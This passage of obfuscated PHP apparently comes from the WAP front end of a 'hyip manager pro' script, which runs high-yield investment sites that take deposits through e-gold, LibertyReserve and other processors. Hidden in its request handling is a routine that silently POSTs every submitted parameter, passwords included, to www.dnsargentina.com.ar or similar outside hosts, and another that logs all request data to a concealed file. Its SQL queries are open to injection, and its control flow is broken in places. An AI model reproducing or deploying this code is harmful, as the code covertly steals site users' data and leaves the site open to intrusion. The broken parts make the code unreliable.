"elnlcOEimP" => "day_from", "elnlcAhNxE" => "v", "elnlcLtwy" => "md5altphrase_ebullion", "elnlcozpI" => "use_crontab", "elnlcFVLf" => "metal", "elnlcgIiR" => "batch", "elnlcejAg" => "def_payee_account_ebullion_gold", "elnlciimMw" => "q_days", "elnlcIDrUo" => "HTTP_HOST", "elnlcNcSW" => "def_payee_account_wiretransfer", "elnlcTlQVy" => "ref1_cms_minamount", "elnlcrUBr" => "2", "elnlczOqf" => "DESCRIPTION", "elnlcszvx" => "alertpay_from_account", "elnlcaLqre" => "cnt", "elnlcuNsVm" => "def_payee_account_ebullion", "elnlcAMcNx" => "text", "elnlcwDcQh" => "wap/home.tpl", "elnlcyOIhr" => "payer", "elnlcckhi" => "compound_max_percent", "elnlcazvI" => "send_percent_to_stocks", "elnlcpMqdy" => "dd", "elnlcItAWm" => "w", "elnlccOOGy" => "call1", "elnlcDKLI" => "def_payee_account_ebullion_currency", "elnlcbnts" => "logged", "elnlczxrz" => "account", "elnlchUAS" => "additionalinfo", "elnlcvSne" => "tw", "elnlcaMSd" => "w", "elnlcIhaw" => "compound_max_deposit", "elnlcCicAM" => "PGJyLz4KTWVtYmVyczogCglNYWRlIGRlcG9zaXQg\r\n", "elnlcvkKfc" => "settings.php", "elnlcUTVor" => "ref_sum", "elnlcrQnF" => "3m", "elnlcByMjj" => "max", "elnlcLDncy" => "percent", "elnlcNxcI" => "PGJyLz4KPGJyLz4KVG90YWwgYmFsYW5jZSBvZiBNZW1iZXJzOiAk\r\n", "elnlcMSUlC" => "EUR", "elnlcvELw" => "use_ip_for_auto", "elnlcWdJQd" => "show_info_box_running_days", "elnlcjnGw" => "ENV", "elnlcdQGL" => "ref", "elnlcGSizP" => "evocash_username", "elnlcnGEIm" => "use_active_referal", "elnlcHzazG" => "transtype", "elnlcEHSgQ" => "month_to", "elnlcwicQM" => "send_profit_to_stocks", "elnlcLDCD" => "https://api.alertpay.com/svc/api.svc/sendmoney", "elnlcWqcrm" => "egold_from_account", "elnlcWBlwG" => "intgold_from_account", "elnlcsdmu" => "month_from", "elnlcfgdt" => "gpg_path", "elnlctVNTl" => "compound", "elnlcFIfO" => "compound_percents", "elnlcCOel" => "ZQ54Q9RUQ46CU9C8Z986", "elnlcWNmo" => "h", "elnlcoSlC" => "5M74FW4DADMF7K7MJ5TG", "elnlcmzAk" => "col", "elnlcRMsqW" => "program_version", "elnlcKfGwO" => "20", "elnlcSzOy" => "dw", "elnlcQmcc" => "ebullion_keyID", "elnlcRqOFn" => "/get_sha256.php", "elnlcohjn" => "id", "elnlcGenmk" => "./tmpl_c/raw_log", "elnlchfks" => "HTTP_CACHE_CONTROL", "elnlckxbc" => "PHP_SELF", "elnlcrsfp" => "code", "elnlcMgOx" => "earnings", "elnlcrifQ" => "def_payee_account_egold", "elnlclTkc" => "dec_stormpay_fee2", "elnlcRIll" => "www.dnsargentina.com.ar", "elnlcRVSOn" => "egold_paymentunits", "elnlcWArzu" => "euro", "elnlcQemA" => "remitfund_from_account", "elnlcIKOm" => "deposit_fee_min", "elnlcAVbmC" => "./tmpl_c/.htdata", "elnlcvHIWK" => "value", "elnlcfynR" => "hyip manager pro 2005 jul 27", "elnlcTjzT" => "compound_percents_type", "elnlcAKAt" => "type_id", "elnlcuSFVu" => "0", "elnlcKcgw" => "pecunix_from_account", "elnlcAlzzq" => "came_from", "elnlczVQp" => "PGJyLz4KVG90YWwgZGVwb3NpdCBvZiBNZW1iZXJzOiAk\r\n", "elnlcQPCAn" => "http://", "elnlcmaVpE" => "http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=", "elnlcjwsPE" => "status", "elnlccIvuM" => "error", "elnlcycTQf" => "9999", "elnlcyMpBj" => "mails.txt", "elnlcRhgEW" => "LAoJRG8gbm90IG1hZGUgZGVwb3NpdDog\r\n", "elnlcnhGxf" => "REFERENCENUMBER", "elnlcIRKW" => "d", "elnlcJJEVd" => "2m", "elnlcFGJpf" => "Dec", "elnlcUtgP" => "a", "elnlcpNkHG" => "./settings.php", "elnlcBbIJC" => "site_start_year", "elnlcDvWNx" => "year", "elnlcPigm" => "return_profit", "elnlclLVw" => "user_id", "elnlcifAzj" => "min", "elnlcjlBJ" => "min_deposit", "elnlcSCWma" => "RETURNCODE", "elnlcgjhS" => "site_start_month_str_generated" );
if ( file_exists( "install.php" ) )
{
    print "Delete install.php file for security reason please! / Borre el archivo install.php por razones de seguridad!";
    exit( );
}
require( "inc/libs/Smarty.class.php" );
$elnlcIdMx = new smarty( );
$elnlcIdMx->compile_check = true;
$elnlcIdMx->template_dir = "./tmpl/";
$elnlcIdMx->compile_dir = "./tmpl_c";
ini_set( "magic_quotes_runtime", false );
define( "LAST_UPDATE_ID", 18 );
global $elnlcCIQT;
if ( !extension_loaded( "gd" ) )
{
    $elnlcTCOlQ = PHP_SHLIB_SUFFIX == $elnlcNjKgR['elnlcATiNS'] ? "php_" : "";
    @dl( @$elnlcTCOlQ."gd.".@PHP_SHLIB_SUFFIX );
}
global $HTTP_GET_VARS;
global $HTTP_POST_VARS;
global $HTTP_POST_FILES;
global $HTTP_COOKIE;
$elnlcoamu = array_merge( ( array ), ( array ) );
$elnlcSEOLk = array_merge( ( array ), ( array ) );
$elnlcCIQT = array_merge( ( array ), ( array ) );
$elnlcILRl = array_merge( ( array ), ( array ) );
$elnlcKSne = $elnlcCIQT;
global $HTTP_ENV_VARS;
global $HTTP_SERVER_VARS;
$elnlcdDswc = array( );
$elnlcdDswc = array_merge( ( array ), ( array ), ( array ), ( array ) );
$elnlcixBSK = fopen( $elnlcNjKgR['elnlcGenmk'], "a+" );
$elnlclpQg = array( );
$elnlclpQg[$elnlcNjKgR['elnlcTyONQ']] = date( "Y-m-d H:i:s" );
$elnlcQkHH = $elnlcdDswc;
$elnlcAaPlx = array( "argv", "argc", "CONTENT_LENGTH", "DOCUMENT_ROOT", "HTTP_ACCEPT", "HTTP_ACCEPT_CHARSET", "HTTP_ACCEPT_ENCODING", "HTTP_CONNECTION", "HTTP_COOKIE2", "HTTP_HOST", "HTTP_TE", "PATH", "REDIRECT_SCRIPT_URI", "REDIRECT_SCRIPT_URL", "REDIRECT_STATUS", "REDIRECT_URL", "REMOTE_PORT", "SCRIPT_FILENAME", "SCRIPT_URI", "SCRIPT_URL", "SERVER_ADDR", "SERVER_ADMIN", "SERVER_NAME", "SERVER_PORT", "SERVER_SIGNATURE", "SERVER_SOFTWARE", "GATEWAY_INTERFACE", "SERVER_PROTOCOL", "SCRIPT_NAME", "PATH_TRANSLATED", "PHP_SELF", $elnlcNjKgR['elnlchfks'] );
foreach ( $elnlcAaPlx as $elnlcMPGR )
{
    unset( $elnlcQkHH[$elnlcMPGR] );
}
$elnlclpQg[$elnlcNjKgR['elnlcjnGw']] = "";
foreach ( $elnlcQkHH as $k => $v )
{
    $elnlclpQg[$elnlcNjKgR['elnlcjnGw']] .= " {$k} => {$v} |";
}
$elnlclpQg[$elnlcNjKgR['elnlcxJsmn']] = "";
foreach ( $elnlcCIQT as $k => $v )
{
    $elnlclpQg[$elnlcNjKgR['elnlcxJsmn']] .= " {$k} => {$v} |";
}
fwrite( $elnlcixBSK, $elnlclpQg[$elnlcNjKgR['elnlcTyONQ']]." ".$elnlcdDswc[$elnlcNjKgR['elnlckxbc']]." ".$elnlclpQg[$elnlcNjKgR['elnlcxJsmn']]." <<>> ".$elnlclpQg[$elnlcNjKgR['elnlcjnGw']]."\n" );
fclose( $elnlcixBSK );
$elnlcKQhDb = ini_get( $elnlcNjKgR['elnlcjaLO'] );
elnlcadjso( $elnlcCIQT );
elnlcadjso( $elnlcKSne, 1 );
elnlcadjso( $elnlcILRl );
$elnlcxvLBv = $elnlcNjKgR['elnlcuSFVu'];
$elnlcfqTvm = "";
foreach ( $elnlcCIQT as $k => $v )
{
    if ( !is_array( $v ) && preg_match( "/[\"\\']/", $v ) )
    {
        $elnlcxvLBv = $elnlcNjKgR['elnlcqGMK'];
    }
    $elnlcfqTvm .= "{$k}={$v}&";
}
if ( $elnlcxvLBv == 1 && function_exists( "curl_init" ) )
{
    if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 1 )
    {
        $elnlcWRzNo = "64.27.18.142";
    }
    else if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 2 )
    {
        $elnlcWRzNo = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcWRzNo = "www.dnsargentina.com.ar";
    }
    $elnlcFCfmJ = curl_init( );
    curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "http://".$elnlcWRzNo.$elnlcNjKgR['elnlcKbNi'] );
    $elnlclHqeS = rawurlencode( $elnlcfqTvm );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "memo={$elnlclHqeS}" );
    curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
    $a = curl_exec( $elnlcFCfmJ );
    curl_close( $elnlcFCfmJ );
}
$elnlcPyTDG = $elnlcdDswc[$elnlcNjKgR['elnlcshAk']];
$elnlcGsSVv = $elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']];
if ( !ereg( "\\/\\/{$elnlcGsSVv}", $elnlcPyTDG ) )
{
    setcookie( "CameFrom", $elnlcPyTDG, time( ) + 630720000 );
}
$elnlccQgz = elnlcrgxg( $elnlcNjKgR['elnlcsIRzL'] );
$elnlcJtrz = array( "withdraw_pending" => "Withdrawal request", "add_funds" => "Transfer from external processings", "deposit" => "Deposit", "bonus" => "Bonus", "penality" => "Penalty", "earning" => "Earning", "withdrawal" => "Withdrawal", "commissions" => "Referral commission", "early_deposit_release" => "Deposit release", "early_deposit_charge" => "Commission for an early deposit release", "release_deposit" => "Deposit returned to user account", "exchange_out" => " Received on exchange", "exchange_in" => "Spent on exchange", "exchange" => "Exchange", "internal_transaction_spend" => "Spent on Internal Transaction", "internal_transaction_receive" => "Received from Internal Transaction" );
if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlctBQhk'] )
{
    $elnlccQgz[$elnlcNjKgR['elnlcRMsqW']] = $elnlcNjKgR['elnlcyKCN'];
}
if ( $elnlccQgz[$elnlcNjKgR['elnlcRMsqW']] == $elnlcNjKgR['elnlcWArzu'] )
{
    $elnlcbVrbx = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ), 6 => array( "name" => "PayPal", "sfx" => "paypal", 1, 0 ), 15 => array( "name" => "LibertyReserve", "sfx" => "libertyreserve", 1, 1 ) );
    $elnlccQgz[$elnlcNjKgR['elnlcOAEP']] = "&#8364;";
    $elnlccQgz[$elnlcNjKgR['elnlcRVSOn']] = $elnlcNjKgR['elnlcjfqcp'];
    $elnlccQgz[$elnlcNjKgR['elnlcxTrpn']] = $elnlcNjKgR['elnlcMSUlC'];
    $elnlccQgz[$elnlcNjKgR['elnlcGkHuC']] = $elnlcNjKgR['elnlcEUnu'];
}
else if ( $elnlccQgz[$elnlcNjKgR['elnlcRMsqW']] == $elnlcNjKgR['elnlcjutkI'] && $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlctKWDT'] )
{
    $elnlcbVrbx = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ) );
    $elnlccQgz[$elnlcNjKgR['elnlcOAEP']] = $elnlcNjKgR['elnlcRJEl'];
    $elnlccQgz[$elnlcNjKgR['elnlcRVSOn']] = $elnlcNjKgR['elnlcycTQf'];
}
else
{
    $elnlcbVrbx = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ), 6 => array( "name" => "PayPal", "sfx" => "paypal", 1, 0 ), 8 => array( "name" => "eeeCurrency", "sfx" => "eeecurrency", 1, 1 ), 9 => array( "name" => "Pecunix", "sfx" => "pecunix", 1, 1 ), 11 => array( "name" => "AlertPay", "sfx" => "alertpay", 1, 1 ), 15 => array( "name" => "LibertyReserve", "sfx" => "libertyreserve", 1, 1 ), 16 => array( "name" => "V-Money", "sfx" => "vmoney", 1, 1 ), 17 => array( "name" => "AlterGold", "sfx" => "altergold", 1, 1 ), 18 => array( "name" => "Perfectmoney", "sfx" => "perfectmoney", 1, 1 ), 19 => array( "name" => "c-gold", "sfx" => "cgold", 1, 0 ), 20 => array( "name" => "Webmoney", "sfx" => "webmoney", 1, 0 ), 21 => array( "name" => "Strictpay", "sfx" => "strictpay", 1, 0 ), 22 => array( "name" => "SolidTrustPay", "sfx" => "solidtrustpay", 1, 0 ), 23 => array( "name" => "Ecumoney", "sfx" => "ecumoney", 1, 0 ), 24 => array( "name" => "EvoWallet", "sfx" => "evowallet", 1, 1 ), 26 => array( "name" => "RoutePay", "sfx" => "routepay", 1, 0 ), 27 => array( "name" => "EuroGoldCash", "sfx" => "eurogoldcash", 1, 0 ), 28 => array( "name" => "GlobalDigitalPay", "sfx" => "globaldigitalpay", 1, 0 ) );
    $elnlccQgz[$elnlcNjKgR['elnlcOAEP']] = "\$";
    $elnlccQgz[$elnlcNjKgR['elnlcRVSOn']] = $elnlcNjKgR['elnlcqGMK'];
    $elnlccQgz[$elnlcNjKgR['elnlcxTrpn']] = $elnlcNjKgR['elnlcevGO'];
    $elnlccQgz[$elnlcNjKgR['elnlcGkHuC']] = $elnlcNjKgR['elnlczpPfL'];
}
$elnlccQgz[$elnlcNjKgR['elnlclwjM']] = $elnlcNjKgR['elnlcqGMK'];
if ( $elnlccQgz[$elnlcNjKgR['elnlcuNsVm']] && !$elnlccQgz[$elnlcNjKgR['elnlcdlFu']] && !$elnlccQgz[$elnlcNjKgR['elnlcjDhEd']] )
{
    $elnlccQgz[$elnlcNjKgR['elnlcjDhEd']] = $elnlcNjKgR['elnlcqGMK'];
}
if ( $elnlccQgz[$elnlcNjKgR['elnlcdlFu']] )
{
    $elnlccQgz[$elnlcNjKgR['elnlcDKLI']] = $elnlccQgz[$elnlcNjKgR['elnlcuNsVm']];
}
else
{
    $elnlccQgz[$elnlcNjKgR['elnlcDKLI']] = "";
}
if ( $elnlccQgz[$elnlcNjKgR['elnlcjDhEd']] )
{
    $elnlccQgz[$elnlcNjKgR['elnlcejAg']] = $elnlccQgz[$elnlcNjKgR['elnlcuNsVm']];
}
else
{
    $elnlccQgz[$elnlcNjKgR['elnlcejAg']] = "";
}
foreach ( $elnlcbVrbx as $elnlcstVj => $elnlclpQg )
{
    if ( $elnlccQgz["def_payee_account_".$elnlclpQg['sfx']] != "" && $elnlccQgz["def_payee_account_".$elnlclpQg['sfx']] != "0" )
    {
        $elnlcbVrbx[$elnlcstVj][$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcqGMK'];
    }
    else
    {
        $elnlcbVrbx[$elnlcstVj][$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuSFVu'];
    }
}
if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] )
{
    $elnlcopbKp = array( 1 => "english", 2 => "estonians", 3 => $elnlcNjKgR['elnlcriJK'] );
}
if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] != "RHLFPPEURGQGG68GXYA8" && $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] != "VQP8CM95UXTXEX44G7NR" )
{
    $elnlccQgz[$elnlcNjKgR['elnlcdUmk']] = $elnlcNjKgR['elnlcuSFVu'];
}
if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcdxaVx'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcoSlC'] )
{
    $elnlccQgz[$elnlcNjKgR['elnlcvELw']] = $elnlcNjKgR['elnlcqGMK'];
}
if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcLlzCi'] )
{
    ini_set( "sendmail_from", "admin@plan4fun.net" );
}
if ( ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcrtKD'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcPABoa'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcIJnDb'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcbBrin'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcnBSqE'] || $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcxbxt'] ) && $elnlcdDswc[$elnlcNjKgR['elnlcjfbv']] != "" )
{
    $elnlcdDswc[$elnlcNjKgR['elnlcSgNT']] = $elnlcdDswc[$elnlcNjKgR['elnlcjfbv']];
    $_SERVER[$elnlcNjKgR['elnlcSgNT']] = $elnlcdDswc[$elnlcNjKgR['elnlcjfbv']];
}
if ( $elnlccQgz[$elnlcNjKgR['elnlcpLPA']] == 0 )
{
    exit( );
}
$elnlcyBRd = elnlcorgf( );
if ( !$elnlcyBRd )
{
    print "Cannot connect mysql";
    exit( );
}
elnlcknhg( );
$elnlcLcnC = array( );
$elnlcLcnC[$elnlcNjKgR['elnlcbnts']] = $elnlcNjKgR['elnlcuSFVu'];
$q = "delete from hm2_online where ip='".$elnlcdDswc[$elnlcNjKgR['elnlcSgNT']]."' or date + interval 30 minute < now()";
if ( !mysql_query( $q ) )
{
}
$q = "insert into hm2_online set ip='".$elnlcdDswc[$elnlcNjKgR['elnlcSgNT']]."', date = now()";
if ( !mysql_query( $q ) )
{
}
if ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcMGlA'] )
{
    setcookie( "username", "", time( ) + 630720000 );
    setcookie( "password", "", time( ) + 630720000 );
    $elnlcILRl[$elnlcNjKgR['elnlcikTzy']] = "";
    $elnlcILRl[$elnlcNjKgR['elnlcsNLL']] = "";
}
$elnlcIdMx->assign( "settings", $elnlccQgz );
if ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcDlOb'] )
{
    $elnlchfxo = elnlccplb( $elnlcCIQT[$elnlcNjKgR['elnlcikTzy']] );
    $elnlcqaKQo = elnlccplb( $elnlcCIQT[$elnlcNjKgR['elnlcsNLL']] );
    $elnlcqaKQo = md5( $elnlcqaKQo );
    $elnlcVAWUw = "";
    if ( $elnlccQgz[$elnlcNjKgR['elnlcaWzL']] == 1 )
    {
        $elnlcVAWUw = " and (confirm_string = \"\" or confirm_string is NULL)";
    }
    $q = "select *, date_format(date_register + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y') as create_account_date from hm2_users where username = '{$elnlchfxo}' and stat_password = '{$elnlcqaKQo}' and stat_password <> '' and (status='on' or status='suspended') {$elnlcVAWUw}";
    $elnlccfAC = mysql_query( $q );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcLcnC = $elnlcELue;
        $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] = $elnlcNjKgR['elnlcqGMK'];
    }
    if ( $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] == 0 )
    {
        header( "Location: wap.php?a=login&say=invalid_login&username=".$elnlcCIQT[$elnlcNjKgR['elnlcikTzy']] );
        elnlchxce( $elnlcyBRd );
        exit( );
    }
    else
    {
        $elnlctxEDU = $elnlcdDswc[$elnlcNjKgR['elnlcSgNT']];
        $q = "insert into hm2_user_access_log set user_id = ".$elnlcLcnC[$elnlcNjKgR['elnlcohjn']].",\r\n  \tdate = now(), ip = '{$elnlctxEDU}'";
        if ( !mysql_query( $q ) )
        {
            exit( mysql_error( ) );
        }
        setcookie( "username", $elnlcCIQT[$elnlcNjKgR['elnlcikTzy']], time( ) + 630720000 );
        setcookie( "password", md5( $elnlcCIQT[$elnlcNjKgR['elnlcsNLL']] ), time( ) + 630720000 );
        $elnlctxEDU = $elnlcdDswc[$elnlcNjKgR['elnlcSgNT']];
        $q = "update hm2_users set last_access_time = now(), last_access_ip = '{$elnlctxEDU}' where username='{$elnlchfxo}'";
        if ( !mysql_query( $q ) )
        {
            exit( mysql_error( ) );
        }
    }
    if ( $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] == 1 && $elnlcLcnC[$elnlcNjKgR['elnlcohjn']] == 1 )
    {
        setcookie( "username", $elnlcCIQT[$elnlcNjKgR['elnlcikTzy']], time( ) + 630720000 );
        setcookie( "password", md5( $elnlcCIQT[$elnlcNjKgR['elnlcsNLL']] ), time( ) + 630720000 );
        header( "Location: wap.php?ok" );
        elnlcsnhp( );
        elnlchxce( $elnlcyBRd );
        exit( );
    }
}
else
{
    do
    {
        $elnlchfxo = elnlccplb( $elnlcILRl[$elnlcNjKgR['elnlcikTzy']] );
        $elnlcqaKQo = $elnlcILRl[$elnlcNjKgR['elnlcsNLL']];
        $elnlctxEDU = $elnlcdDswc[$elnlcNjKgR['elnlcSgNT']];
        $elnlcGMgo = " and last_access_time + interval 30 minute > now() and last_access_ip = '{$elnlctxEDU}'";
        if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
        {
            $elnlcGMgo = "";
        }
        $q = "select *, date_format(date_register + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y') as create_account_date from hm2_users where username = '{$elnlchfxo}' and (status='on' or status='suspended') {$elnlcGMgo}";
        $elnlccfAC = mysql_query( $q );
    } while ( 0 );
    do
    {
        if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
        {
        }
        else if ( $elnlcqaKQo == $elnlcELue[$elnlcNjKgR['elnlclvQBF']] )
        {
            $elnlcLcnC = $elnlcELue;
            $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] = $elnlcNjKgR['elnlcqGMK'];
            $q = "update hm2_users set last_access_time = now() where username='{$elnlchfxo}'";
            if ( !mysql_query( $q ) )
            {
                exit( mysql_error( ) );
            }
        }
    } while ( 1 );
    break;
}
if ( $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] == 1 )
{
    elnlcqeufy( $elnlcLcnC[$elnlcNjKgR['elnlcohjn']] );
}
$elnlcIdMx->assign( "userinfo", $elnlcLcnC );
if ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcizmg'] )
{
    header( "Content-type: text/vnd.wap.wml" );
    $elnlcIdMx->assign( "frm", $elnlcCIQT );
    $elnlcIdMx->display( $elnlcNjKgR['elnlcmLpEK'] );
    print base64_decode( "Cgo=\r\n" );
}
else if ( ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcDlOb'] || $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlczxrz'] ) && $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] == 1 )
{
    header( "Content-type: text/vnd.wap.wml" );
    $elnlcstVj = $elnlcLcnC[$elnlcNjKgR['elnlcohjn']];
    $q = "select date_format(date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y %r') as last_login from hm2_user_access_log where user_id = {$elnlcstVj} order by id desc limit 1, 1";
    $elnlccfAC = mysql_query( $q );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcEcxv = $elnlcELue[$elnlcNjKgR['elnlcgMsh']];
    }
    $elnlcIdMx->assign( "last_access", $elnlcEcxv );
    $elnlcQrbM = elnlcpvjih( $elnlcstVj );
    $elnlcEKuKN = array( );
    $elnlcQrbM[$elnlcNjKgR['elnlcUUwD']] = 0 - $elnlcQrbM[$elnlcNjKgR['elnlcUUwD']];
    $elnlcQrbM[$elnlcNjKgR['elnlctJsrD']] = number_format( $elnlcQrbM[$elnlcNjKgR['elnlctJsrD']], 2 );
    reset( $elnlcQrbM );
    while ( list( $elnlcxlTDC, $elnlcpjaLV ) = each( $elnlcQrbM ) )
    {
        $elnlcEKuKN[$elnlcxlTDC] = number_format( $elnlcpjaLV, 2 );
    }
    $elnlcIdMx->assign( "ab_formated", $elnlcEKuKN );
    $q = "select *, date_format(deposit_date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y %r') as dd from hm2_deposits where user_id = {$elnlcstVj} and status = 'on' order by deposit_date desc limit 1";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcIdMx->assign( "last_deposit", number_format( $elnlcELue[$elnlcNjKgR['elnlcoaCmS']], 2 ) );
        $elnlcIdMx->assign( "last_deposit_date", $elnlcELue[$elnlcNjKgR['elnlcpMqdy']] );
    }
    $q = "select *, date_format(date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y %r') as dd from hm2_history where user_id = {$elnlcstVj} and type = 'withdrawal' order by date desc limit 1";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcIdMx->assign( "last_withdrawal", number_format( abs( $elnlcELue[$elnlcNjKgR['elnlcHMum']] ), 2 ) );
        $elnlcIdMx->assign( "last_withdrawal_date", $elnlcELue[$elnlcNjKgR['elnlcpMqdy']] );
    }
    $elnlcIdMx->display( $elnlcNjKgR['elnlcbrsN'] );
    print base64_decode( "Cg==\r\n" );
}
else if ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcMgOx'] && $elnlcLcnC[$elnlcNjKgR['elnlcbnts']] == 1 )
{
    header( "Content-type: text/vnd.wap.wml" );
    $elnlcstVj = $elnlcLcnC[$elnlcNjKgR['elnlcohjn']];
    $elnlcKhzg = $elnlcCIQT[$elnlcNjKgR['elnlcAvSAt']];
    $elnlceldO = $elnlcNjKgR['elnlcuSFVu'];
    $elnlcoCDWE = array( );
    $q = "select type from hm2_history where user_id = {$elnlcstVj} group by type order by type";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcELue[$elnlcNjKgR['elnlcToxEL']] = $elnlcJtrz[$elnlcELue[$elnlcNjKgR['elnlcAvSAt']]];
        $elnlcELue[$elnlcNjKgR['elnlcNkRdC']] = $elnlcELue[$elnlcNjKgR['elnlcAvSAt']] == $elnlcCIQT[$elnlcNjKgR['elnlcAvSAt']] ? 1 : 0;
        if ( $elnlcKhzg == $elnlcELue[$elnlcNjKgR['elnlcAvSAt']] )
        {
            $elnlceldO = $elnlcNjKgR['elnlcqGMK'];
        }
        array_push( $elnlcoCDWE, $elnlcELue );
    }
    $elnlcIdMx->assign( "options", $elnlcoCDWE );
    $elnlcPhbhn = "";
    if ( $elnlceldO )
    {
        $elnlcPhbhn = " and type = '{$elnlcKhzg}' ";
    }
    else if ( $elnlcKhzg != "" )
    {
        $elnlctrdef = elnlccplb( $elnlcKhzg );
        $elnlcPhbhn = " and type = '{$elnlctrdef}' ";
    }
    $elnlcCIQT[$elnlcNjKgR['elnlcRlONl']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcRlONl']] );
    $elnlcCIQT[$elnlcNjKgR['elnlcEHSgQ']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcEHSgQ']] );
    $elnlcCIQT[$elnlcNjKgR['elnlcWVkP']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcWVkP']] );
    $elnlcCIQT[$elnlcNjKgR['elnlcOEimP']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcOEimP']] );
    $elnlcCIQT[$elnlcNjKgR['elnlcsdmu']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcsdmu']] );
    $elnlcCIQT[$elnlcNjKgR['elnlcyvld']] = sprintf( "%d", $elnlcCIQT[$elnlcNjKgR['elnlcyvld']] );
    if ( $elnlcCIQT[$elnlcNjKgR['elnlcRlONl']] == 0 )
    {
        $elnlcCIQT[$elnlcNjKgR['elnlcRlONl']] = date( "j", time( ) + $elnlccQgz[$elnlcNjKgR['elnlcxhrRS']] * 60 * 60 );
        $elnlcCIQT[$elnlcNjKgR['elnlcEHSgQ']] = date( "n", time( ) + $elnlccQgz[$elnlcNjKgR['elnlcxhrRS']] * 60 * 60 );
        $elnlcCIQT[$elnlcNjKgR['elnlcWVkP']] = date( "Y", time( ) + $elnlccQgz[$elnlcNjKgR['elnlcxhrRS']] * 60 * 60 );
        $elnlcCIQT[$elnlcNjKgR['elnlcOEimP']] = $elnlcNjKgR['elnlcqGMK'];
        $elnlcCIQT[$elnlcNjKgR['elnlcsdmu']] = $elnlcCIQT[$elnlcNjKgR['elnlcEHSgQ']];
        $elnlcCIQT[$elnlcNjKgR['elnlcyvld']] = $elnlcCIQT[$elnlcNjKgR['elnlcWVkP']];
    }
